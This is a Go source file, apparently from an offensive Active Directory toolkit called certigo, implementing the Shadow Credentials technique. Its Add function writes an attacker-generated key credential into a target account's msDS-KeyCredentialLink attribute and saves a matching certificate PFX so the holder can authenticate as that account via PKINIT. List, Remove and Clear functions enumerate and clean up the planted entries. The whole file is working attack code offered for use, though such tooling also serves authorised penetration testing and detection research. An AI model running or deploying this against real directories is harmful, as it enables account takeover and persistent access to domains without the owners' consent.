package shadow

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/hex"
	"errors"
	"fmt"
	"math/big"
	"os"
	"strings"
	"time"

	goldap "github.com/go-ldap/ldap/v3"

	"github.com/ajm4n/certigo/internal/pki"
)

// msDSKeyCredentialLink is the AD attribute that carries the DNBinary-
// encoded KeyCredential entries (MS-ADA3 §2.261).
const attrKeyCredentialLink = "msDS-KeyCredentialLink"

// Options bundles the inputs shared by every shadow action.
type Options struct {
	Conn     *goldap.Conn
	TargetDN string
	OutPFX   string
	PFXPass  string
}

// Add generates a new RSA 2048 key, builds a KeyCredential referencing the
// matching public key, appends the DNBinary-encoded blob to the target's
// msDS-KeyCredentialLink, and writes a self-signed cert + key PFX to
// OutPFX so the caller can follow up with PKINIT via `certigo auth -pfx`.
// It returns the DeviceID (lowercase hex without dashes) of the new entry.
func Add(opts Options) (string, error) {
	if err := validateLDAPOpts(opts); err != nil {
		return "", err
	}

	priv, err := pki.GenerateRSAKey(2048)
	if err != nil {
		return "", fmt.Errorf("shadow: generate RSA: %w", err)
	}

	kc, err := NewRSAKeyCredential(&priv.PublicKey)
	if err != nil {
		return "", err
	}

	dnBinary := kc.MarshalDNBinary(opts.TargetDN)
	if dnBinary == "" {
		return "", fmt.Errorf("shadow: marshal DNBinary failed")
	}

	mod := goldap.NewModifyRequest(opts.TargetDN, nil)
	mod.Add(attrKeyCredentialLink, []string{dnBinary})
	if err := opts.Conn.Modify(mod); err != nil {
		return "", fmt.Errorf("shadow: LDAP modify (add): %w", err)
	}

	if opts.OutPFX != "" {
		if err := writeSelfSignedPFX(priv, opts.TargetDN, opts.OutPFX, opts.PFXPass); err != nil {
			return "", fmt.Errorf("shadow: write PFX: %w", err)
		}
	}

	return hex.EncodeToString(kc.DeviceID[:]), nil
}

// List fetches msDS-KeyCredentialLink for the target and decodes each
// value into a *KeyCredential.
func List(opts Options) ([]*KeyCredential, error) {
	if err := validateLDAPOpts(opts); err != nil {
		return nil, err
	}
	entries, err := readKeyCredentialLink(opts.Conn, opts.TargetDN)
	if err != nil {
		return nil, err
	}
	out := make([]*KeyCredential, 0, len(entries))
	for _, raw := range entries {
		kc, _, perr := ParseDNBinary(raw)
		if perr != nil {
			// Skip garbage rather than fail the whole call.
			continue
		}
		out = append(out, kc)
	}
	return out, nil
}

// Info is List today - callers distinguish "info" by choosing a more
// verbose formatter. The signature matches the spec and leaves room for
// pulling decoded-KeyMaterial extras in the future.
func Info(opts Options) ([]*KeyCredential, error) { return List(opts) }

// Clear removes ALL msDS-KeyCredentialLink values with a single LDAP
// REPLACE carrying an empty list - the canonical way to empty a
// multi-valued attribute.
func Clear(opts Options) error {
	if err := validateLDAPOpts(opts); err != nil {
		return err
	}
	mod := goldap.NewModifyRequest(opts.TargetDN, nil)
	mod.Replace(attrKeyCredentialLink, []string{})
	if err := opts.Conn.Modify(mod); err != nil {
		return fmt.Errorf("shadow: LDAP modify (clear): %w", err)
	}
	return nil
}

// Remove deletes the single msDS-KeyCredentialLink entry whose DeviceID
// matches the hex string deviceID. Dashes in the input are tolerated.
// Because AD does not let us delete individual values of a DNBinary
// multi-valued attribute by identifier, we read every value, parse it,
// and rewrite the attribute with REPLACE omitting the target.
func Remove(opts Options, deviceID string) error {
	if err := validateLDAPOpts(opts); err != nil {
		return err
	}
	want, err := parseDeviceID(deviceID)
	if err != nil {
		return err
	}

	raws, err := readKeyCredentialLink(opts.Conn, opts.TargetDN)
	if err != nil {
		return err
	}
	if len(raws) == 0 {
		return fmt.Errorf("shadow: target has no msDS-KeyCredentialLink entries")
	}

	keep := make([]string, 0, len(raws))
	found := false
	for _, v := range raws {
		kc, _, perr := ParseDNBinary(v)
		if perr != nil {
			// Unparseable entries are preserved - we only remove the
			// specific match.
			keep = append(keep, v)
			continue
		}
		if kc.DeviceID == want {
			found = true
			continue
		}
		keep = append(keep, v)
	}
	if !found {
		return fmt.Errorf("shadow: DeviceID %x not present on target", want[:])
	}

	mod := goldap.NewModifyRequest(opts.TargetDN, nil)
	mod.Replace(attrKeyCredentialLink, keep)
	if err := opts.Conn.Modify(mod); err != nil {
		return fmt.Errorf("shadow: LDAP modify (remove): %w", err)
	}
	return nil
}

// readKeyCredentialLink issues a base-scope search for the one attribute
// we care about and returns the raw DNBinary string values.
func readKeyCredentialLink(conn *goldap.Conn, dn string) ([]string, error) {
	req := goldap.NewSearchRequest(
		dn,
		goldap.ScopeBaseObject,
		goldap.NeverDerefAliases,
		0, 0, false,
		"(objectClass=*)",
		[]string{attrKeyCredentialLink},
		nil,
	)
	res, err := conn.Search(req)
	if err != nil {
		return nil, fmt.Errorf("shadow: LDAP search %s: %w", dn, err)
	}
	if len(res.Entries) == 0 {
		return nil, fmt.Errorf("shadow: target DN not found: %s", dn)
	}
	return res.Entries[0].GetAttributeValues(attrKeyCredentialLink), nil
}

// parseDeviceID normalizes a hex or dashed-GUID string into a 16-byte
// array. Accepts the two common Certipy output forms.
func parseDeviceID(s string) ([16]byte, error) {
	clean := strings.ReplaceAll(s, "-", "")
	clean = strings.TrimSpace(clean)
	b, err := hex.DecodeString(clean)
	if err != nil {
		return [16]byte{}, fmt.Errorf("shadow: decode DeviceID %q: %w", s, err)
	}
	if len(b) != 16 {
		return [16]byte{}, fmt.Errorf("shadow: DeviceID must be 16 bytes, got %d", len(b))
	}
	var out [16]byte
	copy(out[:], b)
	return out, nil
}

// validateLDAPOpts ensures a non-nil connection + a target DN are in
// place. DN validation beyond presence is deferred to the server.
func validateLDAPOpts(opts Options) error {
	if opts.Conn == nil {
		return errors.New("shadow: nil LDAP connection")
	}
	if strings.TrimSpace(opts.TargetDN) == "" {
		return errors.New("shadow: TargetDN is required")
	}
	return nil
}

// writeSelfSignedPFX creates a 1-year self-signed cert for priv with a
// CN derived from the target DN, wraps (cert, key) into a PFX, and
// writes it to path. We reuse pki.SavePFX so the Modern2023 encoder is
// consistent with every other certigo code path.
func writeSelfSignedPFX(priv *rsa.PrivateKey, targetDN, path, password string) error {
	cn := cnFromDN(targetDN)
	if cn == "" {
		cn = "certigo-shadow"
	}
	serial, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	if err != nil {
		return fmt.Errorf("serial: %w", err)
	}
	tmpl := &x509.Certificate{
		SerialNumber:          serial,
		Subject:               pkix.Name{CommonName: cn},
		NotBefore:             time.Now().Add(-time.Minute),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
		BasicConstraintsValid: true,
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &priv.PublicKey, priv)
	if err != nil {
		return fmt.Errorf("create certificate: %w", err)
	}
	cert, err := x509.ParseCertificate(der)
	if err != nil {
		return fmt.Errorf("parse certificate: %w", err)
	}
	pfx, err := pki.SavePFX(&pki.Certificate{Cert: cert, Key: priv}, password)
	if err != nil {
		return err
	}
	if err := os.WriteFile(path, pfx, 0o600); err != nil {
		return fmt.Errorf("write %s: %w", path, err)
	}
	return nil
}

// cnFromDN returns the left-most CN= component of a DN, unescaped enough
// for a self-signed cert subject. Falls back to the raw DN on failure.
func cnFromDN(dn string) string {
	parsed, err := goldap.ParseDN(dn)
	if err != nil || parsed == nil || len(parsed.RDNs) == 0 {
		return ""
	}
	for _, rdn := range parsed.RDNs {
		for _, av := range rdn.Attributes {
			if strings.EqualFold(av.Type, "CN") {
				return av.Value
			}
		}
	}
	return ""
}
